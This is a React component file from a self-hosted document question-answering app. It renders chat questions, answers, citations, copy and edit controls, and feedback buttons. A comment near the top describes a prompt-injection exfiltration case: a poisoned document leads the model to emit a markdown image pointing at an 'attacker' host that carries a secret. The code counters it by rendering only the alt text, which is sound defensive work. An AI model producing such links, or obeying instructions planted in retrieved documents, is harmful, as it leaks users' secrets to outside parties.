import { memo, useEffect, useMemo, useRef, useState } from 'react';
import type { ReactNode } from 'react';
import type { Components } from 'react-markdown';
import type {
  CitationResponse,
  DocumentTask,
  FeedbackRating,
  SummaryCoverage,
  TimingsResponse,
} from '../api/types';
import { formatTurnTime, withCitationFootnotes } from '../utils/exportChat';
import { citationNumberFromHref, linkCitations } from '../utils/citations';
import { usePreviewTrigger } from '../hooks/usePreviewTrigger';
import { pageLabel } from '../utils/pages';
import CitationCard from './CitationCard';
import { useMarkdownRenderer } from './markdownLoader';
import StreamingSkeleton from './StreamingSkeleton';
import './ChatMessage.css';
import { isImeComposing } from '../utils/keyboard';
import { MAX_QUESTION_CHARS } from '../utils/limits';

// Answers quote retrieved documents, and a poisoned document can steer the model into
// writing `![](https://attacker/?q=<secret>)` — which the browser would fetch the moment
// it rendered, no click needed. Show the alt text instead of loading anything.
//
// Headings move down to h3-h6: an answer's "# Summary" sat as a second <h1> under the
// conversation title's, and screen-reader heading navigation treated each answer's
// headings as top-level sections of the page.
const MARKDOWN_COMPONENTS: Components = {
  img: ({ alt }) => (alt ? <span className="chat-message__image-alt">[{alt}]</span> : null),
  a: ({ href, children }) => <ExternalLink href={href}>{children}</ExternalLink>,
  h1: ({ children }) => <h3>{children}</h3>,
  h2: ({ children }) => <h4>{children}</h4>,
  h3: ({ children }) => <h5>{children}</h5>,
  h4: ({ children }) => <h6>{children}</h6>,
  h5: ({ children }) => <h6>{children}</h6>,
  h6: ({ children }) => <h6>{children}</h6>,
  // Wide tables scroll inside the answer instead of widening the page on a phone.
  table: ({ children }) => (
    <div className="chat-message__table-scroll">
      <table>{children}</table>
    </div>
  ),
};

// A link followed in this tab used to unload the app mid-answer. `noreferrer` also
// keeps the DocRAG URL out of wherever a document's link points.
function ExternalLink({ href, children }: { href?: string; children?: ReactNode }) {
  return (
    <a href={href} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  );
}
/** An inline [n] marker: previews its source on hover or focus, opens it on click. */
function InlineCitation({
  number,
  source,
  onOpen,
  onHoverStart,
  onHoverEnd,
}: {
  number: number;
  source: CitationResponse;
  onOpen: () => void;
  onHoverStart: () => void;
  onHoverEnd?: () => void;
}) {
  const trigger = usePreviewTrigger({ onOpen, onHoverStart, onHoverEnd });
  return (
    <button
      type="button"
      className="chat-message__cite"
      {...trigger}
      aria-label={`Source ${number}: ${source.filename}, ${pageLabel(source.page, source.page_end).replace('p.', 'page ')}`}
      data-testid="inline-citation"
    >
      {number}
    </button>
  );
}

// Error turns created before this page load are history, not news: announcing each one
// as an alert on every conversation switch or reload read out stale failures.
const SESSION_STARTED_AT = Date.now();

export interface FeedbackPayload {
  turnId: string;
  rating: FeedbackRating;
  question: string;
  answerExcerpt: string;
  citedFilenames: string[];
  traceId: string | null;
}

export interface ChatTurn {
  id: string;
  role: 'user' | 'assistant' | 'error';
  content: string;
  sources: CitationResponse[];
  timestamp: number;
  timings: TimingsResponse | null;
  traceId: string | null;
  // The question that produced this turn — set on error turns only, so a failed
  // question's text isn't lost and can be resubmitted via the Retry button.
  question?: string;
  // The rating given to this answer, kept on the turn so it survives a reload.
  feedback?: FeedbackRating;
  // Stopped by the user partway: the content is a fragment, not the whole answer.
  stopped?: boolean;
  // Cut off by a failed connection partway: also a fragment (the error turn after it
  // carries the Retry).
  incomplete?: boolean;
  // Served from the server's answer cache rather than generated for this question.
  cached?: boolean;
  // The model that was asked (absent on answers saved before this was recorded).
  model?: string;
  // The server said the documents don't answer it (answer_status insufficient_context
  // or no_context): still an answer, shown with a "not found" flag.
  notFound?: boolean;
  // The answer cites none of its sources (answer_status uncited): worth checking.
  uncited?: boolean;
  // The provider stopped at the token limit, so the answer ends mid-way.
  truncated?: boolean;
  // A whole-document task (summary, comparison) rather than a question: on the user
  // turn that asked it, and on its error turn, so Retry and Regenerate repeat the task.
  task?: DocumentTask;
  // A summary that read only part of a long document (evenly spaced passages).
  coverage?: SummaryCoverage;
  // Questions the server suggests asking next (FOLLOWUPS_ENABLED).
  followups?: string[];
}

interface ChatMessageProps {
  turn: ChatTurn;
  engineerMode: boolean;
  // Set only on the single turn actively streaming; undefined means "not this one".
  streamStage?: string;
  currentModelLabel?: string;
  // `task`: the whole-document task the question was (a summary), repeated as one.
  onRetry?: (question: string, task?: DocumentTask) => void;
  // Regenerate skips the server's answer cache; onRetry is used when this is absent.
  onRegenerate?: (question: string, task?: DocumentTask) => void;
  // Edit a user turn and ask again (a fork — the original conversation is kept).
  onEditQuestion?: (turnId: string, question: string) => void;
  // The question a "Regenerate" click on this (assistant) turn should re-ask —
  // undefined on any turn that isn't a regenerate-able assistant answer. Computed by
  // ChatThread from array position; see precedingUserTurns there.
  regenerateQuestion?: string;
  // The task of that question, when it was a summary or comparison.
  regenerateTask?: DocumentTask;
  // Off (undefined/false) unless the server has AppSettings.feedback_enabled set —
  // sourced from PublicConfigResponse.feedback_enabled via App.tsx.
  feedbackEnabled?: boolean;
  // Presentational: ChatMessage reports what happened (rating + everything needed to
  // build the request) and leaves the actual POST /feedback call to the caller — see
  // FeedbackPayload above.
  onFeedback?: (payload: FeedbackPayload) => void;
  /** `highlights`: the cited passages to mark in the document (CitationResponse.spans). */
  onOpenSource?: (filename: string, chunkId: string, highlights?: string[]) => void;
  onCitationHover?: (citation: CitationResponse) => void;
  onCitationLeave?: () => void;
  // A question is in flight: Regenerate and Retry would be silently ignored by useChat.
  busy?: boolean;
  // Ask one of the turn's suggested follow-ups; set only on the latest answer.
  onAskFollowup?: (question: string) => void;
}

/** Ask again, naming the task only when there is one (a plain question keeps its call). */
function askAgain(
  ask: (question: string, task?: DocumentTask) => void,
  question: string,
  task: DocumentTask | undefined,
): void {
  if (task) ask(question, task);
  else ask(question);
}

function formatDuration(totalMs: number): string {
  return `${(totalMs / 1000).toFixed(2)}s`;
}

function quotesOf(source: CitationResponse): string[] | undefined {
  return source.spans?.length ? source.spans.map((span) => span.quote) : undefined;
}

function ChatMessage({
  turn,
  engineerMode,
  streamStage,
  currentModelLabel,
  onRetry,
  onRegenerate,
  onEditQuestion,
  regenerateQuestion,
  regenerateTask,
  feedbackEnabled,
  onFeedback,
  onOpenSource,
  onCitationHover,
  onCitationLeave,
  busy = false,
  onAskFollowup,
}: ChatMessageProps) {
  const [copied, setCopied] = useState(false);
  const [copyFailed, setCopyFailed] = useState(false);
  // Sticky once set: a rating is a one-shot action, not a toggle — clicking again
  // would just resubmit the same signal, so the buttons disable after the first pick.
  // Seeded from the turn so a remount (reload, conversation switch) can't re-enable them.
  const [feedbackGiven, setFeedbackGiven] = useState<FeedbackRating | null>(turn.feedback ?? null);
  // Follows the turn when a rating that failed to send is taken back.
  useEffect(() => setFeedbackGiven(turn.feedback ?? null), [turn.feedback]);
  const copyTimerRef = useRef<ReturnType<typeof setTimeout> | undefined>(undefined);
  useEffect(() => () => clearTimeout(copyTimerRef.current), []);

  const submitFeedback = (rating: FeedbackRating) => {
    if (!regenerateQuestion || !onFeedback) return;
    setFeedbackGiven(rating);
    onFeedback({
      turnId: turn.id,
      rating,
      question: regenerateQuestion,
      answerExcerpt: turn.content,
      citedFilenames: [...new Set(turn.sources.map((source) => source.filename))],
      traceId: turn.traceId,
    });
  };

  /** Copy without the async Clipboard API, which browsers gate behind a secure context.
   *
   *  DocRAG is self-hosted, so plain HTTP on a LAN address is a first-class deployment
   *  — and there `navigator.clipboard` is undefined. Hiding the button there (what used
   *  to happen) removed the feature from exactly the users the project targets. */
  const legacyCopy = (text: string): boolean => {
    const area = document.createElement('textarea');
    area.value = text;
    // Keep it out of view and off the tab order, but still selectable.
    area.setAttribute('readonly', '');
    area.style.position = 'fixed';
    area.style.top = '-9999px';
    // select() moves focus to the throwaway field; once it was removed, focus fell to
    // <body> and a keyboard user lost their place. It goes back to the Copy button.
    const previous = document.activeElement;
    document.body.appendChild(area);
    area.select();
    try {
      return document.execCommand('copy');
    } catch {
      return false;
    } finally {
      document.body.removeChild(area);
      if (previous instanceof HTMLElement) previous.focus();
    }
  };

  const settle = (ok: boolean) => {
    clearTimeout(copyTimerRef.current);
    if (ok) {
      setCopied(true);
      copyTimerRef.current = setTimeout(() => setCopied(false), 1500);
    } else {
      setCopyFailed(true);
      copyTimerRef.current = setTimeout(() => setCopyFailed(false), 1500);
    }
  };

  const [editing, setEditing] = useState(false);
  const [draft, setDraft] = useState(turn.content);
  // A cancelled edit hands focus back to ✎: the editor unmounting dropped it to <body>.
  // (A sent edit opens a new conversation, which moves focus on its own.)
  const editButtonRef = useRef<HTMLButtonElement>(null);
  const refocusEditRef = useRef(false);
  const cancelEdit = () => {
    refocusEditRef.current = true;
    setEditing(false);
  };
  useEffect(() => {
    if (editing || !refocusEditRef.current) return;
    refocusEditRef.current = false;
    editButtonRef.current?.focus();
  }, [editing]);
  const submitEdit = () => {
    const question = draft.trim();
    if (!question || !onEditQuestion) return;
    setEditing(false);
    onEditQuestion(turn.id, question);
  };

  const handleCopy = () => {
    // The answer's [n] markers would dangle without their sources, so the copy carries
    // them as footnotes — the same lines the Markdown export writes.
    const text = withCitationFootnotes(turn.content, turn.sources);
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text).then(
        () => settle(true),
        // Even in a secure context the write can be denied by permissions policy;
        // fall back rather than reporting failure outright.
        () => settle(legacyCopy(text)),
      );
      return;
    }
    settle(legacyCopy(text));
  };

  const showSkeleton = streamStage !== undefined && turn.content === '';
  const Markdown = useMarkdownRenderer();
  // [n] markers become buttons that open (and on hover preview) the source they cite.
  const markdownComponents = useMemo<Components>(() => {
    const byNumber = new Map(turn.sources.map((source) => [source.source_number, source]));
    return {
      ...MARKDOWN_COMPONENTS,
      a: ({ href, children }) => {
        const number = citationNumberFromHref(href);
        if (number === null) return <ExternalLink href={href}>{children}</ExternalLink>;
        const source = byNumber.get(number);
        if (!source) return <>[{number}]</>;
        return (
          <InlineCitation
            number={number}
            source={source}
            onOpen={() => onOpenSource?.(source.filename, source.chunk_id, quotesOf(source))}
            onHoverStart={() => onCitationHover?.(source)}
            onHoverEnd={onCitationLeave}
          />
        );
      },
    };
  }, [turn.sources, onOpenSource, onCitationHover, onCitationLeave]);
  const linkedContent = useMemo(() => {
    const highest = turn.sources.reduce((max, source) => Math.max(max, source.source_number), 0);
    return linkCitations(turn.content, highest);
  }, [turn.content, turn.sources]);
  const timings = turn.timings;
  const showMeta = engineerMode && turn.role === 'assistant' && !showSkeleton && timings !== null;

  return (
    <div
      className="chat-message"
      data-testid="chat-message"
      data-role={turn.role}
      data-turn-id={turn.id}
    >
      {turn.role === 'user' && (
        <div className="chat-message__row">
          <span className="chat-message__gutter" aria-hidden="true">
            Q
          </span>
          {editing ? (
            <form
              className="chat-message__edit"
              onSubmit={(event) => {
                event.preventDefault();
                submitEdit();
              }}
            >
              <textarea
                className="chat-message__edit-input"
                value={draft}
                onChange={(event) => setDraft(event.target.value)}
                onKeyDown={(event) => {
                  if (isImeComposing(event)) return;
                  if (event.key === 'Escape') {
                    event.stopPropagation();
                    cancelEdit();
                  } else if (event.key === 'Enter' && !event.shiftKey) {
                    event.preventDefault();
                    submitEdit();
                  }
                }}
                aria-label="Edit question"
                maxLength={MAX_QUESTION_CHARS}
                rows={2}
                autoFocus
                data-testid="chat-message-edit-input"
              />
              <div className="chat-message__edit-actions">
                <button type="submit" disabled={busy || !draft.trim()} data-testid="chat-message-edit-send">
                  Ask as new chat
                </button>
                <button type="button" onClick={cancelEdit}>
                  Cancel
                </button>
              </div>
            </form>
          ) : (
            <>
              <p className="chat-message__question">{turn.content}</p>
              {/* A summary's text is a label, not the request: editing it would send a
                  plain question, so summaries are asked again from the corpus panel. */}
              {onEditQuestion && !turn.task && (
                <button
                  ref={editButtonRef}
                  type="button"
                  className="chat-message__edit-button"
                  onClick={() => {
                    setDraft(turn.content);
                    setEditing(true);
                  }}
                  disabled={busy}
                  aria-label="Edit this question"
                  title="Edit and ask again in a new chat"
                  data-testid="chat-message-edit"
                >
                  ✎
                </button>
              )}
            </>
          )}
        </div>
      )}

      {turn.role === 'assistant' && (
        <div className="chat-message__row">
          <span className="chat-message__gutter chat-message__gutter--answer" aria-hidden="true">
            A
          </span>
          <div className="chat-message__answer">
            {showSkeleton ? (
              <StreamingSkeleton stage={streamStage} />
            ) : (
              <div className="chat-message__markdown">
                {Markdown ? (
                  <Markdown
                    text={linkedContent}
                    components={markdownComponents}
                    streaming={streamStage !== undefined}
                  />
                ) : (
                  // The raw answer, not linkedContent: its citation links would show as
                  // "[1](#docrag-cite-1)" until the renderer arrives.
                  <p className="chat-message__plain">{turn.content}</p>
                )}
              </div>
            )}
            <div className="chat-message__meta-row">
              {turn.stopped && (
                <span className="chat-message__flag" data-testid="chat-message-stopped">
                  stopped
                </span>
              )}
              {turn.incomplete && (
                <span
                  className="chat-message__flag"
                  title="The connection failed before this answer finished"
                  data-testid="chat-message-incomplete"
                >
                  incomplete
                </span>
              )}
              {turn.cached && (
                <span
                  className="chat-message__flag"
                  title="Answered from the server's cache — Regenerate asks again"
                  data-testid="chat-message-cached"
                >
                  cached
                </span>
              )}
              {turn.notFound && (
                <span
                  className="chat-message__flag"
                  title="The server found nothing in your documents that answers this"
                  data-testid="chat-message-not-found"
                >
                  not in your documents
                </span>
              )}
              {turn.uncited && (
                <span
                  className="chat-message__flag chat-message__flag--warn"
                  title="The answer cites none of the passages it was given — check it against your documents"
                  data-testid="chat-message-uncited"
                >
                  no sources cited
                </span>
              )}
              {turn.coverage && (
                <span
                  className="chat-message__flag"
                  title="The document is longer than one summary reads (SUMMARY_MAX_BATCHES): it was read at evenly spaced passages"
                  data-testid="chat-message-coverage"
                >
                  read {turn.coverage.read} of {turn.coverage.total} passages
                </span>
              )}
              {turn.truncated && (
                <span
                  className="chat-message__flag chat-message__flag--warn"
                  title="The model reached its output limit (LLM_MAX_TOKENS) and stopped mid-answer"
                  data-testid="chat-message-truncated"
                >
                  cut off
                </span>
              )}
              <time
                className="chat-message__timestamp mono"
                dateTime={new Date(turn.timestamp).toISOString()}
              >
                {formatTurnTime(turn.timestamp)}
              </time>
              {turn.content && (
                <button
                  type="button"
                  className="chat-message__copy"
                  onClick={handleCopy}
                  data-testid="chat-message-copy"
                >
                  {copied ? 'Copied' : copyFailed ? 'Copy failed' : 'Copy'}
                </button>
              )}
              {turn.content && regenerateQuestion && onRetry && !streamStage && !turn.incomplete && (
                <button
                  type="button"
                  className="chat-message__regenerate"
                  disabled={busy}
                  onClick={() => askAgain(onRegenerate ?? onRetry, regenerateQuestion, regenerateTask)}
                  data-testid="chat-message-regenerate"
                >
                  Regenerate
                </button>
              )}
              {turn.content &&
                feedbackEnabled &&
                regenerateQuestion &&
                onFeedback &&
                !streamStage &&
                !turn.incomplete && (
                <div className="chat-message__feedback" role="group" aria-label="Rate this answer">
                  <button
                    type="button"
                    className="chat-message__feedback-btn"
                    aria-pressed={feedbackGiven === 'up'}
                    aria-label="Helpful"
                    title="Helpful"
                    disabled={feedbackGiven !== null}
                    onClick={() => submitFeedback('up')}
                    data-testid="chat-message-feedback-up"
                  >
                    <span aria-hidden="true">{feedbackGiven === 'up' ? '▲' : '△'}</span>
                  </button>
                  <button
                    type="button"
                    className="chat-message__feedback-btn"
                    aria-pressed={feedbackGiven === 'down'}
                    aria-label="Not helpful"
                    title="Not helpful"
                    disabled={feedbackGiven !== null}
                    onClick={() => submitFeedback('down')}
                    data-testid="chat-message-feedback-down"
                  >
                    <span aria-hidden="true">{feedbackGiven === 'down' ? '▼' : '▽'}</span>
                  </button>
                </div>
              )}
            </div>
            {turn.sources.length > 0 && (
              <div className="chat-message__citations" data-testid="chat-message-sources">
                {turn.sources.map((source) => (
                  <CitationCard
                    key={`${turn.id}-${source.source_number}`}
                    sourceNumber={source.source_number}
                    filename={source.filename}
                    page={source.page}
                    pageEnd={source.page_end}
                    section={source.section}
                    onOpen={
                      onOpenSource
                        ? () => onOpenSource(source.filename, source.chunk_id, quotesOf(source))
                        : undefined
                    }
                    onHoverStart={onCitationHover ? () => onCitationHover(source) : undefined}
                    onHoverEnd={onCitationLeave}
                  />
                ))}
              </div>
            )}
            {turn.followups && onAskFollowup && !streamStage && (
              <div className="chat-message__followups" role="group" aria-label="Suggested follow-up questions">
                {turn.followups.map((question) => (
                  <button
                    key={question}
                    type="button"
                    className="chat-message__followup"
                    disabled={busy}
                    onClick={() => onAskFollowup(question)}
                    data-testid="chat-message-followup"
                  >
                    {question}
                  </button>
                ))}
              </div>
            )}
            {showMeta && timings && (
              <div className="chat-message__engineer-meta mono">
                <span>{formatDuration(timings.total_ms)}</span>
                {(turn.model ?? currentModelLabel) && <span>{turn.model ?? currentModelLabel}</span>}
              </div>
            )}
          </div>
        </div>
      )}

      {turn.role === 'error' && (
        <div className="chat-message__row">
          <span className="chat-message__gutter chat-message__gutter--error" aria-hidden="true">
            !
          </span>
          <div
            className="chat-message__error"
            role={turn.timestamp >= SESSION_STARTED_AT ? 'alert' : undefined}
          >
            {turn.content}
            {turn.question && onRetry && (
              <button
                type="button"
                className="chat-message__retry"
                disabled={busy}
                onClick={() => askAgain(onRetry, turn.question!, turn.task)}
                data-testid="chat-message-retry"
              >
                Retry
              </button>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

// Default shallow-compare memo is sufficient: `turn` keeps referential identity for
// every turn except the one an update actually targets (see useChat's
// updateAssistantTurn), and the callback props are stabilized at their App.tsx source
// (askQuestion, onOpenSource, onCitationLeave) or are native useState setters
// (onCitationHover). Without this, every prior answer's ReactMarkdown re-parses on
// every SSE delta of the currently streaming turn — cost scales with conversation
// length instead of staying O(1).
export default memo(ChatMessage);
